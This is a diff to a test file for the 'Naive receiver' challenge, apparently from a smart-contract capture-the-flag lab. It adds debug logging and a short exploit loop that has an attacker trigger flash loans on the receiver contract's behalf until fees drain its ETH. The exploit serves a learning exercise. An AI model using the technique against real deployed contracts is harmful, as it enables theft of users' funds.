@@ -21,16 +21,28 @@ describe('[Challenge] Naive receiver', function () {
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
         
         expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
+        console.log(await ethers.provider.getBalance(this.pool.address))
         expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
         
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
+        console.log(await ethers.provider.getBalance(this.receiver.address));
+
+        
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */  
+        let receiverbal =  await ethers.provider.getBalance(this.receiver.address)
+        while (receiverbal != 0) {
+            await this.pool.connect(attacker).flashLoan(this.receiver.address,'1');
+            receiverbal = await ethers.provider.getBalance(this.receiver.address);
+            console.log((await ethers.provider.getBalance(this.receiver.address)).toString());
+        }
+         
+         
     });
 
     after(async function () {
